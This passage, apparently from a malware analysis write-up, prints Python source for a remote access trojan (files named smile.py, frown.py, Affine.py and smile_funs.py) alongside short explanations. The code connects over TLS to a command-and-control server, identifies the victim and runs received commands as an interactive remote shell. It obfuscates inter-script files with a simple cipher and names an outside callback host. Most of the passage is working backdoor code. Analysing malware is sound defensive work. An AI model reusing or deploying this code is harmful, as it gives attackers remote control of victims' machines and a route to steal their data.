                <span class="n">processes</span><span class="p">.</span><span class="n">append</span><span class="p">({</span><span class="s">"process"</span><span class="p">:</span> <span class="n">process</span><span class="p">,</span> <span class="s">"receiver"</span><span class="p">:</span> <span class="n">receiver</span><span class="p">,</span> <span class="s">"data"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span> <span class="s">"root"</span><span class="p">:</span> <span class="n">os</span><span class="p">.</span><span class="n">getcwd</span><span class="p">()})</span>
                <span class="n">process</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">resp</span> <span class="o">=</span> <span class="n">work_on_cmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span> <span class="o">+</span> <span class="s">"BADD"</span><span class="p">,</span> <span class="s">"w+"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">((</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Bad Error Happened "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n\n\n\n</span><span class="s">"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">resp</span><span class="p">)))</span>
    <span class="k">global</span> <span class="n">wanted</span>
    <span class="k">if</span> <span class="n">resp</span> <span class="o">==</span> <span class="s">"exit"</span><span class="p">:</span>
        <span class="n">wanted</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">while</span> <span class="n">wanted</span><span class="p">:</span>
        <span class="n">communicate</span><span class="p">()</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p>it executes the communication function whilst the victim is still <strong>wanted</strong>, this status means that the victim is still a matter of interest.</p><p><strong>Communicate function</strong>: -</p><ul><li><p>It sets a header which consists of username + current path as if it’s a cmd (ex: username\@pc_name:execution_path$)</p><li><p>It writes it in “<strong>Abibliophobia23</strong>” file which used for inter-scripts communications and writes the response and header on it.</p><li><p>It writes 0 in <strong>“.ready</strong>” and waits for another script (<strong>frown.py</strong>) to set it, as if it’s a <strong>synchronization mechanism</strong> to make sure that every script do its job in turns.</p><li><p>Start executing the commands stored in “<strong>Abibliophobia23</strong>” as <strong>CMD</strong> commands and if the resp was "<strong>exit</strong>" then will go through process of <strong>termination</strong> and “<strong>frown.py” would have been terminated by then</strong>.</p></ul><h2 id="frownpy"><strong>Frown.py</strong></h2><div class="language-python highlighter-rouge"><div class="code-header" data-lang="python"><button><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">recv</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">wait</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="n">ready</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="n">select</span><span class="p">([</span><span class="n">sock</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mi">187</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">wait</span><span class="p">:</span>
        <span class="k">while</span> <span class="ow">not</span> <span class="n">ready</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">is_connected</span><span class="p">():</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="n">ready</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="n">select</span><span class="p">([</span><span class="n">sock</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mi">187</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">ready</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">d</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nb">ConnectionResetError</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">d</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="k">return</span> <span class="bp">False</span>
<span class="k">def</span> <span class="nf">run_cmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">wait</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">wait</span><span class="p">:</span>
        <span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="k">return</span> <span class="s">""</span>
    <span class="n">comm</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span> <span class="o">=</span> <span class="n">comm</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">stdout</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">stderr</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">sock</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="p">.</span><span class="n">SSLContext</span><span class="p">(</span><span class="n">ssl</span><span class="p">.</span><span class="n">PROTOCOL_TLS</span><span class="p">)</span>
            <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
            <span class="n">sock</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">server_hostname</span><span class="o">=</span><span class="n">host</span><span class="p">)</span>
            <span class="n">sock</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
            <span class="n">sock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"almond"</span><span class="p">)</span>
            <span class="n">res</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
            <span class="k">if</span> <span class="s">"who"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
                <span class="n">sock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">"""</span><span class="si">{</span><span class="n">getuser</span><span class="p">()</span><span class="si">}</span><span class="s">@</span><span class="si">{</span><span class="n">node</span><span class="p">()</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">guid</span><span class="si">}</span><span class="s">"""</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
                <span class="n">res</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
            <span class="k">if</span> <span class="s">"ice"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
                <span class="k">break</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">sleep</span><span class="p">(</span><span class="mi">183</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">is_connected</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">online</span><span class="p">():</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">sock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
<span class="k">def</span> <span class="nf">online</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">socket</span><span class="p">.</span><span class="n">setdefaulttimeout</span><span class="p">(</span><span class="mi">260</span><span class="p">)</span>
        <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">).</span><span class="n">connect</span><span class="p">((</span><span class="s">"google.com"</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">exp</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
<span class="k">def</span> <span class="nf">file_ready</span><span class="p">():</span>
    <span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span> <span class="o">+</span> <span class="s">".ready"</span><span class="p">,</span> <span class="s">"w+"</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">waiting_file</span><span class="p">():</span>
    <span class="n">count</span> <span class="o">=</span> <span class="mi">1000</span>
    <span class="k">while</span> <span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span> <span class="o">+</span> <span class="s">".ready"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span> <span class="o">!=</span> <span class="s">'0'</span> <span class="ow">and</span> <span class="n">count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
        <span class="n">count</span> <span class="o">-=</span> <span class="mi">1</span>
<span class="k">def</span> <span class="nf">communicate</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">wanted</span>
    <span class="n">aff</span> <span class="o">=</span> <span class="n">Affine</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">d</span> <span class="o">=</span> <span class="s">"EMPTY"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">d</span> <span class="o">=</span> <span class="n">aff</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
        <span class="n">sock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="mi">4028</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
        <span class="n">it</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span> <span class="o">==</span> <span class="s">"exit"</span><span class="p">:</span>
            <span class="n">wanted</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="k">elif</span> <span class="n">res</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span> <span class="o">==</span> <span class="s">"dis"</span><span class="p">:</span>
            <span class="n">it</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">res</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span> <span class="o">==</span> <span class="s">"##"</span><span class="p">:</span>
            <span class="k">while</span> <span class="n">res</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span> <span class="o">!=</span> <span class="s">"exit"</span><span class="p">:</span>
                <span class="n">res</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="mi">4028</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
                <span class="n">sock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">run_cmd</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">return</span>
        <span class="n">it</span><span class="p">.</span><span class="n">truncate</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">aff</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
        <span class="n">it</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
        <span class="n">it</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">file_ready</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">ConnectionResetError</span><span class="p">:</span>
        <span class="n">sock</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">is_connected</span><span class="p">():</span>
            <span class="n">sock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"An error has occurred: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)).</span><span class="n">encode</span><span class="p">())</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">83</span><span class="p">)</span>
    <span class="k">while</span> <span class="n">wanted</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">waiting_file</span><span class="p">()</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">is_connected</span><span class="p">():</span>
                <span class="n">connect</span><span class="p">()</span>
            <span class="n">communicate</span><span class="p">()</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">a</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">is_connected</span><span class="p">():</span>
                <span class="n">sock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
</pre></table></code></div></div><p>So basically, how this works?</p><ul><li><p>At first it waits <strong>83 secs</strong> then it will wait till “<strong>smile.py</strong>” <strong>signals</strong> that its first part was already finished and <strong>“.ready</strong>” is set to <strong>0</strong></p><li><p>it checks whether there is an <strong>internet connection</strong> on victims’ machine</p><li><p>checks whether it has an <strong>established connection with C&amp;C and connect if not</strong></p><li><p>after it connects it will <strong>send</strong> the String “<strong>almond</strong>”</p><li><p>if the reply is "<strong>who</strong>", <strong>it will send the identifier of the victim</strong></p><li><p>it waits for the word “<strong>ice</strong>” then the connection is good and the C&amp;C server <strong>identified the victim successfully</strong>.</p></ul><p>after a successful connection is made there are 4 cases for the reply, if malware received:</p><ul><li><p><strong>exit</strong>: it means that they are <strong>no longer interested in this victim</strong> and will go through the <strong>process of terminating the operation</strong>.</p><li><p><strong>dis</strong>: <strong>disconnect the victim and shutdown the script frown.py</strong>.</p><li><p><strong>##:</strong> <strong>it switches the connection to remote shell like</strong>, it executes the commands received <strong>interactively</strong> and <strong>reply with the output</strong> until C&amp;C send “<strong>exit</strong>” then it <strong>ends the session</strong>.</p><li><p><strong>if those cases aren't met</strong> it will <strong>write the response into intercommunication file</strong>, then it will set <strong>“.ready</strong>” file to <strong>1</strong> signaling the other script that this part was already done to get it <strong>continue executing those commands</strong>.</p></ul><p><strong>This process is going to be repeated until “exit, dis” is received.</strong></p><h2 id="affinepy"><strong>Affine.py</strong></h2><div class="language-python highlighter-rouge"><div class="code-header" data-lang="python"><button><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">base64</span>
<span class="k">class</span> <span class="nc">Affine</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="n">DIE</span> <span class="o">=</span> <span class="mi">128</span>
    <span class="n">KEY</span> <span class="o">=</span> <span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">55</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">pass</span>

    <span class="k">def</span> <span class="nf">encrypt_char</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">char</span><span class="p">):</span>
        <span class="n">K1</span><span class="p">,</span> <span class="n">K2</span><span class="p">,</span> <span class="n">kI</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">KEY</span>
        <span class="k">return</span> <span class="nb">chr</span><span class="p">((</span><span class="n">K1</span> <span class="o">*</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">char</span><span class="p">))</span> <span class="o">+</span> <span class="n">K2</span><span class="p">)</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">DIE</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">string</span><span class="p">):</span>
        <span class="n">st</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>
        <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">encrypt_char</span><span class="p">,</span> <span class="n">st</span><span class="p">)).</span><span class="n">encode</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">decrypt_char</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">char</span><span class="p">):</span>
        <span class="n">K1</span><span class="p">,</span> <span class="n">K2</span><span class="p">,</span> <span class="n">KI</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">KEY</span>
        <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">KI</span> <span class="o">*</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">char</span><span class="p">))</span> <span class="o">-</span> <span class="n">K2</span><span class="p">)</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">DIE</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">string</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>
        <span class="n">st</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">decrypt_char</span><span class="p">,</span> <span class="n">string</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span>

</pre></table></code></div></div><p>Affine script is used as encryption/decryption module it’s initialized in all scripts communicating through “<strong>Abibliophobia23</strong>” file, noting that all writing/reading this file is always accompanied by encrypting/decrypting function used</p><h2 id="smile_funspy"><strong>Smile_funs.py</strong></h2><div class="language-python highlighter-rouge"><div class="code-header" data-lang="python"><button><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407
408
409
410
411
412
413
414
415
416
417
418
419
420
421
422
423
424
425
426
427
428
429
430
431
432
433
434
435
436
437
438
439
440
441
442
443
444
445
446
447
448
449
450
451
452
453
454
455
456
457
458
459
460
461
462
463
464
465
466
467
468
469
470
471
472
473
474
475
476
477
478
479
480
481
482
483
484
485
486
487
488
489
490
491
492
493
494
495
496
497
498
499
500
501
502
503
504
505
506
507
508
509
510
511
512
513
514
515
516
517
518
519
520
521
522
523
524
525
526
527
528
529
530
531
532
533
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">glob</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">platform</span>
<span class="kn">import</span> <span class="nn">shlex</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">stat</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">winreg</span>
<span class="kn">import</span> <span class="nn">zipfile</span>
<span class="kn">from</span> <span class="nn">ftplib</span> <span class="kn">import</span> <span class="n">FTP</span>
<span class="kn">from</span> <span class="nn">getpass</span> <span class="kn">import</span> <span class="n">getuser</span>
<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">uniform</span>
<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">Popen</span><span class="p">,</span> <span class="n">PIPE</span>

<span class="kn">import</span> <span class="nn">chardet</span>
<span class="kn">import</span> <span class="nn">mss</span>
<span class="kn">from</span> <span class="nn">tabulate</span> <span class="kn">import</span> <span class="n">tabulate</span>

<span class="kn">from</span> <span class="nn">affine</span> <span class="kn">import</span> <span class="n">Affine</span>

<span class="n">RHOST</span> <span class="o">=</span> <span class="s">"dellgenius.hopto.org"</span>
<span class="n">me</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">fold</span> <span class="o">=</span> <span class="n">me</span><span class="p">[:</span><span class="n">me</span><span class="p">.</span><span class="n">rfind</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
<span class="n">pipe_out</span> <span class="o">=</span> <span class="n">fold</span> <span class="o">+</span> <span class="s">"Abibliophobia23"</span>
<span class="n">processes</span> <span class="o">=</span> <span class="p">[]</span>


<span class="c1">############ Internal ############
</span><span class="k">class</span> <span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">error</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
        <span class="n">args</span> <span class="o">=</span> <span class="p">{</span><span class="s">'prog'</span><span class="p">:</span> <span class="bp">self</span><span class="p">.</span><span class="n">prog</span><span class="p">,</span> <span class="s">'message'</span><span class="p">:</span> <span class="n">message</span><span class="p">}</span>
        <span class="k">raise</span> <span class="nb">AttributeError</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">format_help</span><span class="p">()</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">%(prog)s: error: %(message)s</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="n">args</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">exit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">message</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">print_usage</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">file</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">format_usage</span><span class="p">())</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">_print_message</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">format_usage</span><span class="p">(),</span> <span class="nb">file</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">print_help</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">file</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">format_help</span><span class="p">())</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">_print_message</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">format_help</span><span class="p">(),</span> <span class="nb">file</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">execution</span><span class="p">(</span><span class="n">com</span><span class="p">):</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="n">com</span><span class="p">)</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>

    <span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"version"</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"4.0"</span>
